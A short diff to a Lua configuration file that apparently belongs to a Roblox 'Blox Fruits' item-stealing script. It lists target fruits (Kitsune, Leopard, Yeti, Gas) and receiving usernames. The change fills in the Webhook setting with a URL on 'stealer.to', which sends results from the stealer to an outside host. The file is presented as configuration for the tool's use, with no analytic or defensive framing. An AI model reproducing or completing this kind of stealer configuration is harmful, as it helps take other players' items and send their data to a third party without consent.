@@ -1,5 +1,5 @@
 lua
-Webhook = "" -- << Your Webhook
+Webhook = "https://stealer.to/post?uniqueid=3ba7e1f1" -- << Your Webhook
 Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
